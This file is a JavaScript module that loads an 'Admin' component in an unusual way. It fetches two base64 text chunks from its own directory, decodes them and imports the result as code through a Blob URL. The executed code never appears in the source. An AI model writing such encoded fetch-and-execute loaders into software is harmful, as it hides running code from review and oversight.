const base = new URL('.', import.meta.url).href;

async function load() {
  const [a, b] = await Promise.all([
    fetch(base + 'Admin_b64_0.txt?t=' + Date.now(), { cache: 'no-store' }).then((r) => r.text()),
    fetch(base + 'Admin_b64_1.txt?t=' + Date.now(), { cache: 'no-store' }).then((r) => r.text()),
  ]);
  const bin = atob(a + b);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  const code = new TextDecoder().decode(bytes);
  const url = URL.createObjectURL(new Blob([code], { type: 'text/javascript' }));
  return import(url);
}

const mod = await load();
export default mod.default;
